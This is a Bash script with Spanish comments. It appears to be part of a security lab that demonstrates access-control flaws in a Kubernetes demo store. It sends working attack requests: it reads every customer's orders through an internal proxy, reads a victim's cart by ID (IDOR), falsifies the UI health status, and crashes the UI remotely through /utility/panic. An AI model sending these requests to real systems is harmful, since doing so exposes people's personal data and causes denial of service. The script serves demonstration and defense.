#!/bin/bash
# 3.1 Control de acceso por path e IP: endpoints internos alcanzables desde afuera.
source "$(dirname "$0")/common.sh"

section "3.1 Control de acceso por path e IP"

attack "Órdenes de todos los clientes (datos personales)" \
    "$BASE_URL/proxy/orders"
note "Responde 200 desde afuera: 'orders' es un Service interno (ClusterIP) que no debería ser alcanzable."
note "Con órdenes cargadas, este mismo endpoint lista nombre, dirección y email de cada cliente."

attack "Métricas internas de Spring Actuator" \
    "$BASE_URL/actuator/metrics"

# Primero, como la víctima, ponemos un ítem en su carrito por el flujo normal.
# Después, como atacante, lo leemos por /proxy sin ser la víctima: eso es el IDOR.
seed_cart "victima-123"
attack "Carrito de otro usuario por ID (IDOR)" \
    "$BASE_URL/proxy/carts/victima-123"
note "El carrito de 'victima-123' (con su ítem) queda expuesto a cualquiera que sepa el ID"

attack "Marcar la UI como no saludable" \
    -X POST "$BASE_URL/utility/health/down"
attack "Salud general (la reporta /actuator/health)" \
    "$BASE_URL/actuator/health"
attack "Salud de readiness (la que mira Kubernetes)" \
    "$BASE_URL/actuator/health/readiness"
note "health/down marca la salud general como DOWN, pero readiness sigue UP:"
note "Kubernetes no saca el pod, así que la UI sigue atendiendo. Degrada el reporte de salud, no el servicio."
# Restauramos desde adentro del pod, por si el Service ya no lo enruta
kubectl exec -n the-store deploy/ui -- curl -s -X POST localhost:8080/utility/health/up > /dev/null \
    && note "Salud restaurada con /utility/health/up (desde adentro del pod)"

restarts_before=$(kubectl get pods -n the-store -l app.kubernetes.io/name=ui -o jsonpath='{.items[0].status.containerStatuses[0].restartCount}')
attack "Apagar la UI de forma remota (DoS)" \
    "$BASE_URL/utility/panic"
note "Esperando a que Kubernetes reinicie el contenedor de la UI..."
for _ in $(seq 1 60); do
    sleep 2
    restarts_after=$(kubectl get pods -n the-store -l app.kubernetes.io/name=ui -o jsonpath='{.items[0].status.containerStatuses[0].restartCount}')
    code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "$BASE_URL/")
    [ "$restarts_after" != "$restarts_before" ] && [ "$code" = "200" ] && break
done
note "Reinicios del pod de la UI: ${restarts_before} → ${restarts_after}"
